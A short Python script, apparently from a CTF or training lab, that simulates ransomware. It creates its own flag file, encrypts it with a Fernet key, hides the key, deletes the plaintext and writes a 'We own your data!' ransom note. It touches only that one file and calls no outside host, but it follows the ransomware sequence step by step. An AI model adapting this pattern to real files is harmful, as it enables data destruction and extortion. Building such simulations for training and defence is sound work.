#!/usr/bin/env python3
#This is a simulation script to create a text file and then encrypt it. This could simulate a Ransoomware attack. The script also dumps a ransom note for the admin.
#Make sure cryptography is installed on the system
#If this is a new system, chmod the file: chmod +x purePwnage.py

import os
from cryptography.fernet import Fernet
from datetime import datetime

# Define the plain text file and encrypted file names
PLAIN_TEXT_FILE = 'company_secrets.txt'
ENCRYPTED_FILE = f'{PLAIN_TEXT_FILE}.encrypt'
RANSOM_NOTE = 'ransom_note.txt'

# Function to generate a key for encryption
def generate_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# Function to load the key from the current directory named `secret.key`
def load_key():
    """
    Load the previously generated key
    """
    return open("secret.key", "rb").read()

# Function to encrypt a file
def encrypt_file(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and write it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(ENCRYPTED_FILE, "wb") as file:
        file.write(encrypted_data)

# Function to create ransom note
def create_ransom_note():
    """
    Create a ransom text file containing metadata about the encryption process and payment instructions
    """
    with open(RANSOM_NOTE, 'w') as ransom_note:
        ransom_note.write("We own your data!\n")
        ransom_note.write(f"Encryption Time: {datetime.now()}\n")

# Function to rename a file
def rename_file(filename, new_filename):
    """
    Renames the specified file from filename to new_filename
    """
    if os.path.exists(filename):
        os.rename(filename, new_filename)
        print(f"Renamed {filename} to {new_filename}")
    else:
        print(f"{filename} does not exist")

# Function to delete a file
def delete_file(filename):
    """
    Deletes the specified file
    """
    if os.path.exists(filename):
        os.remove(filename)
        print(f"Deleted {filename}")
    else:
        print(f"{filename} does not exist")

# Main function to handle the encryption process
def main():
    # Generate and load key
    generate_key()
    key = load_key()

    # Create plain text file
    with open(PLAIN_TEXT_FILE, 'w') as file:
        file.write("This is the CTF flag!")

    # Encrypt the plain text file
    encrypt_file(PLAIN_TEXT_FILE, key)

    # Rename the secret.key file to .secret.key after use
    rename_file('secret.key', '.secret.key')

    # Delete the plain text file
    delete_file(PLAIN_TEXT_FILE)

    # Create metadata file
    create_ransom_note()

    print(f"Encrypted File: {ENCRYPTED_FILE}")
    print(f"Ransome Note: {RANSOM_NOTE}")

if __name__ == "__main__":
    main()
